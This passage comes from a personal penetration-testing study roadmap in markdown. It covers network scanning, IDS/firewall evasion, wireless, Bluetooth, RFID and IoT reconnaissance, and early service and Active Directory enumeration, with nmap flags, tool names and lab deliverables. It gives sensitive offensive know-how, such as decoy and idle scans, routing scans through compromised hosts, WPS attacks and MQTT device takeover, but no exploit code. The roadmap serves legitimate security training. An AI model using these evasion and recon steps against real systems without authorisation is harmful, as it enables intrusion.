- [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.

---

### Topic 2: Port, Service & Protocol Enumeration (The "Door Check") — 🔬 Practical
[[Topic-2_Port-Scanning-Techniques|📁]]

> [!TIP]
> **Goal:** Determine exactly what applications are running and how they communicate.

> [!NOTE]
> ⏱️ **Time Bracket: 2–3 days** — Day 1: Stealth SYN scan (`nmap -sS` — half-open, not logged by most application servers), version detection (`-sV` — banner grabbing + probe-based fingerprinting), OS fingerprinting (`-O` — TCP/IP stack analysis, requires root), TCP connect scan vs SYN scan trade-offs. Day 2: UDP scanning (`nmap -sU` — slow, unreliable, but critical: DNS/53, SNMP/161, TFTP/69, DHCP/67 often missed), service-specific NSE scripts (`--script=banner,http-title,ssh-auth-methods`), IPv6 scanning (`nmap -6`). Day 3: Repeat against a second lab target, memorize which Nmap flags require root, which are safe vs aggressive, which generate the most detection noise. Deliverable: fully documented Nmap scan of a lab target including all open TCP + UDP ports, service versions, and OS guess.

- [ ] **Stealth SYN Scanning:** Use `nmap -sS` to identify open ports without completing the three-way **Handshake**, minimizing my footprint in application logs.

- [ ] **Version & OS Fingerprinting:** Deploy `nmap -sV` for service banners and `nmap -O` to analyze TCP/IP stack responses for **Operating System Hardening** clues.

- [ ] **Protocol Audit:** Analyze discovered services to determine if they use **Secure vs Insecure Protocols** (e.g., FTP vs SFTP, SSL vs TLS).

- [ ] **Connection Handshake Analysis:** Examine **Handshakes** to understand the specific authentication and encryption methods protecting the service.

- [ ] **UDP Surface Check:** Do not ignore `nmap -sU` for often-overlooked services like DNS (53), SNMP (161), and DHCP (67).

- [ ] **Timing & Hygiene:** Apply sane **-T profiles**, exclusion lists, and prefer **safe NSE** scripts before vuln categories to avoid tripping controls.

- [ ] **IPv6 Stack:** Mirror key scans with **`nmap -6`** for IPv6 services.

---

### Topic 3: Defense & Configuration Assessment (The "Armor Check") — 🔬 Practical
[[Topic-3_Service-and-OS-Fingerprinting|📁]]

> [!TIP]
> **Goal:** Identify security controls that will attempt to block or alert on my presence.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — Firewall & ACL enumeration (analyze filtered port behavior: RST vs no response vs ICMP unreachable — each tells a different story about what’s blocking), IDS/IPS probing (fragmented packets `-f`, decoy IPs `-D`, timing profiles `-T0/T1`), web surface discovery (ffuf/Gobuster with SecLists `directory-list-2.3-medium.txt` targeting `/admin`, `/config`, `/backup`, `/api`), service-specific enumeration (SMB/RPC, LDAP/Kerberos, SNMP, SMTP VRFY/EXPN, SSH KEX algorithms, RDP NLA check). Deliverable: document the firewall rule posture of your lab target based only on nmap scan behavior (no login).

- [ ] **Firewall & ACL Enumeration:** Detect the presence of a **Firewall & Nextgen Firewall** or **Host Based Firewalls** by analyzing filtered ports and **ACL** (Access Control List) behavior.

- [ ] **IDS/IPS Probing:** Use fragmentation (`-f`) or timing decoys (`-D`) to identify active **NIDS, NIPS, or HIPS** systems that may block aggressive patterns.

- [ ] **Web Surface Discovery:** Use `ffuf` or `Gobuster` for **Directory Brute-forcing** to find hidden `/admin` or `/config` panels that are not linked publicly.

- [ ] **Service-Specific Enum:** Targeted checks for **SMB/RPC/WinRM**, **LDAP/Kerberos (AS-REP preauth, SPNs)**, **SNMP v1/v2c/v3**, **SMTP VRFY/EXPN**, **SSH KEX/ciphers**, **RDP/NLA**, **DBs (MySQL/MSSQL/Postgres)**, **Redis/Mongo/Elastic**.

---

### Topic 4: Vulnerability Association & Attack Mapping — 🧠🔬 Mixed
[[Topic-4_Nmap-Deep-Reference|📁]]

> [!TIP]
> **Goal:** Convert raw scan data into actionable exploitation vectors.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: NSE scripted vuln probing (`--script vuln` — understand what each script tests before running it), CVE mapping (service version → searchsploit/ExploitDB lookup, NVD API, Vulners NSE). Day 2: Attack surface selection (version-to-exploit decision matrix: known public CVE with public PoC > misconfiguration > default credentials > brute force), PCAP intelligence (identify cleartext protocol traffic that enables credential capture or replay). Deliverable: produce a vulnerability mapping for your lab scan — list each open service, its version, associated CVEs, and intended exploitation path.

- [ ] **Scripted Vulnerability Probing:** Use the **Nmap Scripting Engine (NSE)** (`--script vuln`) to check for known **Zero Day** or common exploits in identified versions.

- [ ] **Attack Surface Selection:** Match findings to my known **Common Attacks**—e.g., **SQL Injection** for web servers or **Buffer Overflows** for legacy binaries.

- [ ] **Traffic Intelligence:** Finalize my plan by inspecting **Packet Captures** for cleartext protocols or weak encryption that allows for **MITM** or **Replay Attacks**.

- [ ] **Cluster & Correlate:** Group hosts by **banners/JA3/favicons** and map versions to likely **CVEs** before exploitation.

---

### Topic 5: Stealth & Evasion Techniques — 🔬 Practical
[[Topic-5_Vulnerability-Scanning|📁]]

> [!TIP]
> **Goal:** Scan without detection by firewalls, IDS, and EDR.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: Fragmentation (`nmap -f` — split packets to bypass signature IDS), decoy scanning (`-D RND:5,ME` — flood IDS with fake source IPs), timing profiles (T0 = paranoid 5min/probe, T1 = sneaky, T3 = normal, T5 = insane — know what changes at each level), null/FIN/Xmas scans (bypass stateless firewalls, fail against Windows). Day 2: ACK scanning (`-sA` — maps firewall rulesets, never establishes connections), idle/zombie scanning (`-sI` — blind scan via third party), source port spoofing (`--source-port 53` — bypass port-based ACLs), Scapy custom packet crafting (craft arbitrary IP/TCP headers for DPI bypass). Deliverable: compare scan results and IDS alert counts for a lab target using T5 vs T1 timing, fragmentation on vs off.

- [ ] **Fragmentation & Decoys:** Use `nmap -f` (fragment packets) or `-D` (decoy IPs) to evade **NIDS/NIPS signature detection**.

- [ ] **Timing Profiles:** Apply appropriate `-T` profile (T0-T5) to avoid triggering **rate-based IDS rules** or **adaptive firewalls**.

- [ ] **Null/FIN/Xmas Scans:** Use alternative scan types (`nmap -sN/-sF/-sX`) that bypass **stateless firewalls** but may not work through **stateful firewalls**.

- [ ] **ACK Scanning:** Use `-sA` to map **firewall rule sets** without attempting to establish connections.

- [ ] **Idle/Zombie Scanning:** Use `-sI` with a **zombie host** to perform **blind port scans** that don't directly originate from my IP.

- [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.

- [ ] **Packet Manipulation:** Craft **custom packets** with **[[Scapy]]** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.

---

### Topic 6: Advanced Scanning Techniques — 🔬 Practical
[[Topic-6_Advanced-Scanning-Techniques|📁]]

> [!TIP]
> **Goal:** Optimize scanning efficiency and discover hidden services.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: masscan for high-speed sweeps (rate 10000 pps, export to XML for Nmap re-scan), custom NSE script writing (understand the Nmap scripting API, write a basic service banner extractor). Day 2: WAF/CDN bypass (historical DNS to find origin IP, direct IP scan bypassing Cloudflare), CT log recon (parse crt.sh API programmatically for hidden subdomains), proxychains + VPN scan routing (obscure source IP, route through compromised host). Deliverable: use masscan + Nmap in a two-phase scan (masscan finds open ports, nmap `-sV -sC` only against those ports) and compare speed vs accuracy.

- [ ] **Parallel & Distributed Scanning:** Use **masscan** for rapid scanning of large ranges; distribute scans across **multiple IPs/proxies** to avoid threshold detection.

- [ ] **Custom Probes & NSE Scripting:** Write **NSE scripts** for **service-specific probing** (e.g., extracting **SANs from TLS**, **banner grabbing**, **service enumeration**).

- [ ] **WAF/CDN Bypass:** Identify backend IPs via **DNS history, SSL cert mismatches, HTTP header fingerprints**, and scan directly if possible.

- [ ] **Certificate Transparency (CT) Recon:** Parse **CT logs** to discover **hidden subdomains, domain variants, and organization structure**.

- [ ] **Reverse DNS Lookup:** Use **reverse DNS** to discover **vhosts, services, and hostnames** associated with IP ranges.

- [ ] **Proxychains & Proxy Pivoting:** Route scans through **VPNs, proxies, compromised hosts** to obscure source IP and bypass **geographic restrictions**.

---

### Topic 7: Wireless & IoT Network Scanning — 🔬 Practical
[[Topic-7_Wireless-IoT-Scanning|📁]]

> [!TIP]
> **Goal:** Discover and enumerate wireless networks and IoT devices beyond traditional TCP/IP scanning.

> [!NOTE]
> ⏱️ **Time Bracket: 3–4 days** — Expand reconnaissance beyond traditional TCP/IP to discover and enumerate wireless protocols and IoT devices that operate outside standard network scanning. Master wireless interface configuration (monitor mode with airmon-ng/iw, channel hopping across 2.4GHz/5GHz bands, adapter chipset compatibility), 802.11 WiFi reconnaissance (airodump-ng for AP enumeration, hidden SSID detection, client probing, WPS vulnerability scanning, channel utilization analysis), and Bluetooth/BLE intelligence (device discovery with hcitool, BLE advertisement scanning, GATT service enumeration). Explore IoT-specific protocols including Zigbee network scanning (Killerbee), Z-Wave device enumeration, LoRaWAN gateway detection, MQTT broker discovery (ports 1883/8883), and CoAP service detection (port 5683/UDP). Learn IoT service fingerprinting through UPnP/SSDP scanning, mDNS/DNS-SD enumeration (Avahi/Bonjour), and Shodan/Censys IoT queries, plus wireless IDS/IPS detection techniques. Deliverable: map all wireless networks within range (WiFi, Bluetooth, BLE), enumerate IoT devices on a test network, and build a custom wireless scanner in Python using Scapy.

- [ ] **Monitor Mode Configuration:** Use airmon-ng or iw to place wireless adapter in monitor mode (promiscuous packet capture). Verify mode with `iwconfig`. *Wireless angle: monitor mode required for passive packet capture; managed mode only receives packets destined for adapter MAC.*
- [ ] **Channel Hopping & Frequency Selection:** Scan across all 2.4GHz channels (1-14) and 5GHz channels (36, 40, 44, 48, 149-165) to detect APs on different frequencies. Use `airodump-ng --band abg` for dual-band scanning. *Wireless angle: APs spread across spectrum; static channel = missed targets.*
- [ ] **Adapter Chipset Compatibility:** Atheros (ath9k), Ralink (rt2800usb), Realtek (rtl8812au) drivers support monitor mode and packet injection. Intel adapters generally don't. *Wireless angle: cheap USB adapters (TP-Link Archer T2U, Alfa AWUS036ACH) outperform expensive built-in Intel cards for pentesting.*
- [ ] **Wireless Card Power Output Adjustment:** Increase TX power to extend range (`iw dev wlan0 set txpower fixed 3000` = 30dBm). Legal limits vary by region. *Wireless angle: higher power = more APs detected but may violate local regulations; reduce for stealth.*
- [ ] **Multiple Interface Management (Virtual Interfaces):** Create virtual interfaces (`iw phy phy0 interface add mon0 type monitor`) to monitor on multiple channels simultaneously. *Wireless angle: parallel monitoring across multiple channels reduces scan time.*

- [ ] **airodump-ng Continuous Monitoring:** Capture beacon frames, probe requests, data frames for all APs in range. Output shows BSSID, ESSID, channel, encryption, signal strength, client count. *Wireless angle: passive reconnaissance — no packets sent to targets, zero detection risk.*
- [ ] **Kismet Passive Detection with GPS Integration:** Alternative to airodump-ng with web UI, packet storage, and GPS logging for wardriving. Detects hidden SSIDs, rogue APs, Bluetooth. *Wireless angle: mobile assessment (car/bike wardriving); GPS correlates APs to physical locations.*
- [ ] **Wash WPS-Enabled AP Detection:** Identify Access Points with WiFi Protected Setup (WPS) enabled. WPS has known vulnerabilities (Pixie Dust, PIN brute-force). *Wireless angle: WPS-enabled = high-value target; offline PIN cracking often succeeds.*
- [ ] **Hidden SSID Detection via Probe Responses:** Hidden networks don't broadcast SSID in beacons but reveal it in probe responses when clients connect. Monitor probe requests from clients to enumerate hidden networks. *Wireless angle: "hidden" SSID is security theater — SSID visible in probe traffic; clients broadcast previously connected network names.*
- [ ] **Channel Utilization Analysis:** Measure channel congestion and interference. Crowded channels (1, 6, 11 in 2.4GHz) have more noise. *Wireless angle: target APs on less congested channels for cleaner captures; channel overlap causes frame loss.*
- [ ] **Associated Client Enumeration:** Identify all devices currently connected to each AP via data frames. Track client MACs. *Wireless angle: client count indicates business hours, high-value targets (corporate APs with many clients), deauth attack feasibility.*
- [ ] **Probe Request Monitoring (Saved Networks Leak):** Clients broadcast probe requests for previously connected networks ("HomeNetwork", "Starbucks WiFi", "CompanyVPN"). *Wireless angle: probe requests reveal travel history, home network names, employer identity — social engineering context and evil twin attack targets.*
- [ ] **Client MAC Address Tracking:** Track device movement across APs, identify unique devices by MAC. *Wireless angle: MAC randomization (iOS 14+, Android 10+) complicates tracking but many devices still use static MACs.*
- [ ] **Client Device Fingerprinting via OUI Lookup:** First 3 bytes of MAC (OUI) identify manufacturer. `00:0C:41` = Cisco, `00:1B:63` = Apple. *Wireless angle: device type inference — Apple MACs = iPhones/MacBooks (high-value targets), IoT devices have distinctive OUIs.*
- [ ] **Encryption Type Identification:** Detect Open (no encryption), WEP (broken), WPA/WPA2-PSK (crackable with handshake), WPA2-Enterprise (802.1X), WPA3 (resistant to offline attacks). *Wireless angle: encryption type dictates attack strategy — WPA2-PSK = handshake capture + offline crack; WPA3 = online only or exploit Dragonblood vulnerabilities.*
- [ ] **WPS Vulnerability Scanning:** Pixie Dust attack (weak random number generation allows PIN recovery in seconds) and PIN brute-force (10^4 attempts, ~4-10 hours). *Wireless angle: WPS enabled = backdoor; disable WPS in production.*
- [ ] **Rogue AP Detection:** Identify unauthorized APs in corporate environment (employee personal hotspots, attacker evil twins). Match against authorized AP list. *Wireless angle: rogue APs bypass network security controls; employees' personal hotspots leak corporate data.*
- [ ] **Evil Twin Identification:** Detect spoofed APs using legitimate SSID. Compare BSSID, signal strength, channel with known-good AP. *Wireless angle: evil twins capture credentials (captive portal phishing); users rarely verify BSSID authenticity.*

- [ ] **Bluetooth Classic Device Discovery (hcitool scan):** Discover Bluetooth Classic devices (BR/EDR) in range. Returns MAC address and device name. *Bluetooth angle: classic Bluetooth has longer range but higher power consumption; used by headphones, car systems, keyboards.*
- [ ] **Bluetooth Service Enumeration (sdptool browse):** Query discovered device for available services (SPP, OBEX, HFP, A2DP). *Bluetooth angle: service enumeration reveals device capabilities (file transfer, audio streaming, phone calls); attack surface assessment.*
- [ ] **Bluetooth Version Fingerprinting:** Identify Bluetooth version (2.0, 3.0, 4.0, 5.0) from advertisements or service records. *Bluetooth angle: older versions have known vulnerabilities (BlueBorne, KNOB attack); version dictates security capabilities.*
- [ ] **Bluetooth Name Enumeration:** Device names often reveal manufacturer, model, owner (e.g., "John's iPhone", "Living Room TV"). *Bluetooth angle: name = attribution + device type; social engineering context.*
- [ ] **BLE Advertisement Scanning (hcitool lescan):** Bluetooth Low Energy devices broadcast advertisements continuously. Passive collection reveals device presence without connection. *BLE angle: BLE used by fitness trackers, smart locks, beacons, medical devices — low power, always-on broadcasting.*
- [ ] **GATT Service Enumeration (gatttool):** Query BLE device for GATT (Generic Attribute Profile) services and characteristics after connection. *BLE angle: GATT services expose device functionality (heart rate, battery level, custom data); read/write operations often lack authentication.*
- [ ] **BLE Characteristic Reading:** Read values from BLE characteristics (sensor data, configuration, status). Many characteristics readable without pairing. *BLE angle: unauthenticated reads leak sensitive data (location history from fitness tracker, lock status from smart lock).*
- [ ] **UUID-Based Service Identification:** Bluetooth services identified by UUIDs (16-bit for standard services, 128-bit for vendor-specific). *BLE angle: UUID lookup reveals standard service types (0x180F = Battery Service); custom UUIDs require reverse engineering.*
- [ ] **Bluetooth Tools:** hcitool (device discovery), bluetoothctl (interactive Bluetooth management), sdptool (service discovery), gatttool (GATT client), btscanner (GUI scanner). *Bluetooth angle: hcitool for scripting, bluetoothctl for interactive exploration.*

- [ ] **Proximity Card Detection (125kHz, 13.56MHz):** Low-frequency (125kHz) proximity cards (HID Prox, EM4102) and high-frequency (13.56MHz) smart cards (Mifare, DESFire, iClass). *RFID angle: 125kHz cards are easily cloned; 13.56MHz have encryption but many implementations weak.*
- [ ] **NFC Tag Enumeration (NDEF, Mifare):** Read NFC Data Exchange Format (NDEF) messages from tags. Mifare Classic and Ultralight common in access control. *NFC angle: NFC = contactless payment, access badges, public transit cards; tag data often unencrypted.*
- [ ] **RFID Reader Detection & Identification:** Detect presence of RFID readers via electromagnetic emissions. Identify reader model/manufacturer. *RFID angle: reader presence = badge-based access control in use; cloning attacks viable.*
- [ ] **RFID/NFC Tools:** Proxmark3 (universal RFID tool for read/write/clone/emulate), ACR122U (USB NFC reader/writer), libnfc (open-source NFC library). *RFID angle: Proxmark3 is gold standard but expensive (~$300); ACR122U is budget option (~$30) for basic NFC.*

- [ ] **Zigbee Network Scanning (Killerbee, Attify Zigbee):** Zigbee operates on 2.4GHz (channels 11-26, overlapping with WiFi). Scan for Zigbee networks and nodes. *IoT angle: Zigbee used by smart home devices (Philips Hue, smart locks, sensors); unencrypted join process allows network infiltration.*
- [ ] **Zigbee Channel Scanning (11-26):** Scan all Zigbee channels to detect networks. Channel utilization varies. *IoT angle: Zigbee shares 2.4GHz with WiFi; interference from crowded WiFi channels affects Zigbee performance.*
- [ ] **Zigbee Device Enumeration & Fingerprinting:** Identify coordinator, routers, end devices in Zigbee network. Device profiles reveal capabilities. *IoT angle: coordinator compromise = full network control; end devices (sensors) often have weak/no authentication.*
- [ ] **Z-Wave Device Discovery:** Z-Wave operates on sub-1GHz frequencies (908MHz US, 868MHz EU). Requires Z-Wave transceiver (Z-Wave USB stick). *IoT angle: Z-Wave used for home automation (locks, thermostats, lighting); proprietary protocol but tools exist (z-wave-js, scapy-radio).*
- [ ] **Z-Wave Node ID Enumeration:** Z-Wave networks have controller and up to 232 nodes. Enumerate node IDs and device types. *IoT angle: node enumeration reveals network topology; older Z-Wave (pre-S2) has no encryption.*
- [ ] **Z-Wave Version Detection:** Z-Wave versions (Classic, Plus, S2) have different security features. S2 mandatory encryption; older versions optional/absent. *IoT angle: version detection dictates attack strategy — pre-S2 = plaintext traffic capture; S2 = encryption but key exchange vulnerabilities exist.*
- [ ] **LoRaWAN Gateway Discovery:** LoRa operates on ISM bands (868MHz EU, 915MHz US). Long range (10km+) but low bandwidth. Detect LoRaWAN gateways via beacon frames. *IoT angle: LoRaWAN used for IoT sensors (agriculture, utilities, smart cities); gateways relay sensor data to cloud.*
- [ ] **LoRaWAN Network Scanning (868MHz, 915MHz):** Requires SDR (Software Defined Radio) or LoRa transceiver. Capture LoRa packets and decode LoRaWAN frames. *IoT angle: LoRaWAN encryption (AES-128) but join process (OTAA) has replay attack vectors.*
- [ ] **LoRaWAN Device Enumeration:** Identify end devices (DevEUI), applications (AppEUI), network servers via traffic analysis. *IoT angle: DevEUI enumeration maps sensor deployment; traffic patterns reveal data collection schedules.*
- [ ] **MQTT Broker Discovery (Port 1883/8883):** MQTT is pub/sub messaging protocol used by IoT devices. Port 1883 unencrypted, 8883 TLS. Scan for open brokers. *IoT angle: MQTT brokers often misconfigured with anonymous access; subscribe to `#` wildcard to capture all messages.*
- [ ] **MQTT Anonymous Authentication Testing:** Connect without credentials to test for anonymous access. Many public MQTT brokers allow this. *IoT angle: anonymous access = full visibility into device commands and telemetry; publish to control topics = device takeover.*
- [ ] **MQTT Topic Enumeration:** Topics organized hierarchically (`home/livingroom/temperature`). Brute-force or discover via wildcard subscriptions. *IoT angle: topic names reveal device types, locations, commands; predictable naming aids enumeration.*
- [ ] **MQTT Tools:** mosquitto_sub (subscribe to topics), mosquitto_pub (publish messages), MQTT Explorer (GUI client for browsing topics). *IoT angle: MQTT Explorer visualizes topic tree; mosquitto CLI for automation.*
- [ ] **CoAP Service Detection (Port 5683 UDP):** Constrained Application Protocol, RESTful protocol for resource-constrained devices. Operates over UDP. *IoT angle: CoAP used by embedded devices with limited memory/CPU; similar to HTTP but lightweight.*
- [ ] **CoAP Resource Discovery (/.well-known/core):** CoAP endpoints advertise available resources via RFC 6690. Query `/.well-known/core` to enumerate all resources. *IoT angle: resource discovery reveals device API endpoints; many CoAP implementations lack authentication.*
- [ ] **CoAP Endpoint Enumeration:** GET/POST/PUT/DELETE methods similar to HTTP. Test access control on each resource. *IoT angle: CoAP access control often absent; unauthenticated PUT/DELETE = device reconfiguration/DoS.*
- [ ] **CoAP Tools:** coap-client (command-line CoAP client), libcoap (CoAP library for custom tools). *IoT angle: coap-client for manual testing; libcoap for scripting automated enumeration.*

- [ ] **UPnP Device Discovery (miranda, upnp-inspector):** Universal Plug and Play devices announce themselves via SSDP (Simple Service Discovery Protocol) multicast. Discover printers, routers, media servers, smart TVs. *IoT angle: UPnP commonly enabled by default; many implementations allow remote control without authentication.*
- [ ] **SSDP Multicast Queries:** Send M-SEARCH requests to 239.255.255.250:1900 to enumerate UPnP devices. *IoT angle: SSDP amplification DDoS vector; also reconnaissance for device inventory.*
- [ ] **UPnP Service Enumeration & Exploitation:** Query device XML description to enumerate available services (WANIPConnection, ContentDirectory). Many services have unauthenticated control points. *IoT angle: UPnP exploits = port forwarding manipulation, firewall bypass, device configuration changes.*
- [ ] **Avahi (Linux) & Bonjour (macOS) mDNS Discovery:** Multicast DNS (mDNS) allows zero-configuration service discovery on local network. Devices announce services via mDNS. *IoT angle: mDNS reveals network printers, file shares, AirPlay devices, APIs without DNS server.*
- [ ] **Service Type Enumeration (_http._tcp, _ssh._tcp):** mDNS services advertised with service type strings. Common types: `_http._tcp` (web servers), `_ssh._tcp` (SSH servers), `_printer._tcp` (network printers). *IoT angle: service types bypass port scanning; devices announce capabilities directly.*
- [ ] **Hostname Resolution via mDNS:** Resolve `.local` domains via mDNS queries. Example: `printer.local`, `nas.local`. *IoT angle: mDNS hostnames more stable than DHCP IPs; persistent device identification.*
- [ ] **mDNS/DNS-SD Tools:** avahi-browse (Linux mDNS browser), dns-sd (macOS/BSD DNS Service Discovery). *IoT angle: avahi-browse lists all advertised services in real-time; `avahi-browse -a` for comprehensive scan.*
- [ ] **Shodan IoT Device Type Filtering:** Search Shodan for specific device types: `product:webcam`, `device:router`, `category:ics` (industrial control systems), `nas` (network-attached storage). *IoT angle: Shodan indexes internet-facing IoT devices; find targets before scanning your own network.*
- [ ] **Shodan Default Credential Identification:** Many Shodan queries show devices with default credentials still configured. Cross-reference with DefaultCreds-cheat-sheet. *IoT angle: default credentials = instant access; manufacturers ship insecure defaults, users never change them.*
- [ ] **Shodan Vulnerable Firmware Detection:** Search for specific firmware versions with known CVEs (e.g., `product:hikvision firmware:V5.3.0`). *IoT angle: firmware version = precise vulnerability matching; automated exploitation scripts target specific versions.*

- [ ] **WIPS Detection Techniques:** Wireless Intrusion Prevention Systems monitor for rogue APs, deauth attacks, suspicious traffic patterns. Detect WIPS by observing active countermeasures (deauth floods against unauthorized devices). *Wireless angle: WIPS presence indicates mature security program; adjust attack techniques for stealth.*
- [ ] **Deauthentication Frame Monitoring:** Monitor for deauth frames sent by WIPS to disconnect rogue devices. High deauth frame rate = active WIPS. *Wireless angle: deauth flood against your adapter = WIPS detection; change MAC address and reduce activity.*
- [ ] **Honeypot AP Identification:** Fake APs deployed to detect attackers. Characteristics: strong signal but no clients, unusual SSID patterns, immediate response to connection attempts. *Wireless angle: honeypot connection = detection + attribution; identify honeypots before engagement.*
- [ ] **Wireless Security Appliance Fingerprinting:** Identify vendor/model of wireless security appliances (AirMagnet, Aruba RFProtect, Cisco MSE) via management interface signatures or behavior patterns. *Wireless angle: vendor identification reveals capabilities and bypass techniques specific to that platform.*

### Lab Progression (Module 09: Scanning)

| Level | Task | Deliverable |
| ----- | ------------------------------------------------------------- | ------------------------------- |
| 1 | Scan a home lab subnet with Nmap (host discovery + port scan) | Nmap output report |
| 2 | Perform service version detection and OS fingerprinting | Annotated scan results |
| 3 | Write a custom NSE script to detect a specific vulnerability | Working .nse script |
| 4 | Scan a target through a proxy chain / VPN tunnel | Scan results + stealth analysis |
| 5 | Compare scan results with and without IDS evasion techniques | Evasion effectiveness report |

> [!IMPORTANT]
> **Move-On Gate:** I can discover all live hosts and open ports on a /24 subnet, identify service versions and OS types, and adapt scan techniques to evade basic IDS detection.

---

---

## Module 10: Enumeration
[[Module-10_Enumeration|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `Hacking Exposed` — Service-specific chapters (SMB, SNMP, LDAP, RPC) — classic enumeration playbook, still directly applicable
> - 🟡 `Counter Hack Reloaded - Ed Skoudis & Tom Liston` — Enumeration chapters (SMB, LDAP, SNMP) — structured per-protocol coverage and what data each leaks
> - 🟢 `Cyberjutsu Cybersecurity for the Modern Ninja` — Enumeration section — attacker-focused methodology in clear tactical language

> [!NOTE]
> **Note:** Module 09 (Scanning) covers host discovery, port scanning, and defense identification. Module 10 focuses specifically on **extracting detailed information from discovered services** to build an attack profile. If I haven't completed Module 09, do so first.

> [!TIP]
> ⏱️ **Module 10 Total Time Budget: 1.5 weeks**
> Topic 1 (service/banner): 2–3 days | Topic 2 (directory/identity): 2 days | Topic 3 (DNS/infra): 1–2 days | Topic 4 (DB/app): 1–2 days | Topic 5 (surface consolidation + OpSec): 1 day | Labs: 3–4 days.
> Enumeration is where most pentesters find their critical paths. A missed SNMP community string or an overlooked NFS export can be the difference between a stalled engagement and Domain Admin. Don’t rush this module.

### Topic 1: Service Enumeration & Banner Grabbing — 🔬 Practical
[[Topic-1_NetBIOS-and-SMB-Enumeration|📁]]

> [!TIP]
> **Goal:** Extract version, configuration, and identity information from each discovered service.

> [!NOTE]
> ⏱️ **Time Bracket: 2–3 days** — Day 1: Banner grabbing (Netcat/Telnet/nmap `-sV` — connect to every open port and read what it says), SMB enumeration (enum4linux-ng: null session, shares, users, password policy; smbclient share listing; NetExec/nxc for quick domain context). Day 2: SNMP enumeration (snmpwalk with `public`/`private`/`internal` — extract routing tables, ARP cache, running processes, installed software, interface IPs; onesixtyone for community string brute-force), NFS showmount (world-readable exports, root squash disabled). Day 3: SSH audit (ssh-audit for KEX/cipher/MAC strength, deprecated algorithms), RDP NTLM info extraction, and consolidate all findings. Deliverable: enumerate SMB + SNMP on a lab target and extract a complete user list, share list, and at least 5 system details from SNMP.

- [ ] **Banner Grabbing:** Use **[[Netcat]], Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.

- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [[NetExec]] (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.

- [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.

- [ ] **NFS Enumeration:** Use **showmount -e** to discover **exported shares**; check for **world-readable exports** and **root squash misconfigurations**.

- [ ] **SSH Enumeration:** Fingerprint **SSH versions, supported algorithms, key exchange methods** using **ssh-audit**; identify **weak ciphers, deprecated protocols**.

- [ ] **RDP Enumeration:** Use **nmap --script rdp-enum-encryption, rdp-ntlm-info** to extract **OS version, domain info, NLA requirements** from RDP endpoints.

---

### Topic 2: Directory & Identity Enumeration — 🔬 Practical
[[Topic-2_SNMP-Enumeration|📁]]

> [!TIP]
> **Goal:** Map users, groups, and organizational structure from directory services.

> [!NOTE]
> ⏱️ **Time Bracket: 2 days** — Day 1: LDAP enumeration (ldapsearch anonymous bind — extract users, groups, computers, password policies; `ldapsearch -x -H ldap://<target> -b "DC=corp,DC=local"`), Active Directory recon (ldapsearch + enum4linux-ng + BloodHound SharpHound collector — map domain trusts, group membership, delegation, SPNs). Day 2: Kerberos enumeration (kerbrute userenum — valid username enumeration via AS-REQ pre-auth failure response differences; identify AS-REP Roastable accounts: UF_DONT_REQUIRE_PREAUTH set), SMTP VRFY/EXPN (verify valid email addresses and usernames on mail servers), RPC enumeration (rpcclient null session: `enumdomusers`, `enumdomgroups`, `lookupnames`). Deliverable: enumerate a lab AD domain with BloodHound and identify the shortest path to Domain Admin from a domain user account.

- [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.

- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [[BloodHound]]** to map **domain trusts, group membership, SPNs, delegation**.

- [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.

- [ ] **SMTP Enumeration:** Use **VRFY, EXPN, RCPT TO** commands to **verify valid email addresses and usernames** on mail servers.

- [ ] **RPC Enumeration:** Use **rpcclient, rpcinfo** to enumerate **RPC endpoints, user SIDs, domain information, printer shares**.

---

### Topic 3: DNS & Infrastructure Enumeration — 🔬 Practical
[[Topic-3_LDAP-and-Active-Directory-Enumeration|📁]]

> [!TIP]
> **Goal:** Extract naming, network, and infrastructure intelligence from DNS.

> [!NOTE]
> ⏱️ **Time Bracket: 1 day** — DNS zone transfer attempts (AXFR/IXFR via `dig axfr @<ns-server> target.com` — most modern DNS servers block this, but internal DNS often doesn’t), full DNS record enumeration (A/AAAA/MX/TXT/SRV/CNAME/NS/PTR — each reveals different infrastructure topology), DNS split-view identification (internal vs external zone discrepancies — used for DNS rebinding attacks), reverse DNS PTR sweeps (`nmap -sL <IP range>` or `dig -x <IP>`) — reveals hostnames, naming conventions, hidden services. Deliverable: perform a full DNS enumeration against your lab domain and build a complete infrastructure map from only DNS data.

- [ ] **DNS Zone Transfer:** Attempt **AXFR/IXFR** transfers to extract **full DNS records** and internal hostnames.

- [ ] **DNS Record Enumeration:** Query **A, AAAA, MX, TXT, SRV, CNAME, NS, PTR** records to map **mail servers, services, subdomains, SPF/DMARC/DKIM** policies.

- [ ] **DNS Spoofing Prep:** Identify **DNS split-view** configurations and **internal domain naming** for **DNS rebinding attacks**.

- [ ] **Reverse DNS Sweeps:** Perform **PTR record lookups** across discovered IP ranges to reveal **hostnames, naming conventions, and hidden services**.

---

### Topic 4: Database & Application Enumeration — 🔬 Practical
[[Topic-4_DNS-and-SMTP-Enumeration|📁]]

> [!TIP]
> **Goal:** Extract schemas, credentials, and data from discovered database and application services.

> [!NOTE]
